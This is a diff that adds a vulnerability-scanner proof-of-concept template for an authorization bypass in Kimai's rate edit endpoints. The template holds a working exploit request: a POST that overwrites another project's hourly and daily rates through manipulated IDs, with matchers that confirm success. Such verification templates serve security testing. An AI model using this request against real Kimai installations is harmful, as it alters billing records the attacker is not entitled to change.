@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "验证 Kimai rate edit endpoints的跨作用域授权绕过漏洞。未经授权的用户可通过操控父ID和子子ID参数修改其他父对象的费率记录。这影响ProjectRate、CustomerRate和ActivityRate编辑，存在严重的安全风险。"
+id = "POC-AVE-2026-0386"
+name = "Kimai Rate Edit Authorization Bypass PoC"
+severity = "high"
+tags = ["ave-2026-0386"]
+vuln_id = [
+    "CVE-2026-52826",
+    "AVE-2026-0386",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/en/admin/project/{{ProjectId}}/rate/{{RateId}}"
+protocol = "http"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Rate updated successfully",
+    "modified",
+]
+
+[poc.requests.poc.requests.body]
+content = "hourly_rate={{HourlyRate}}&daily_rate={{DailyRate}}"
+type = "form"
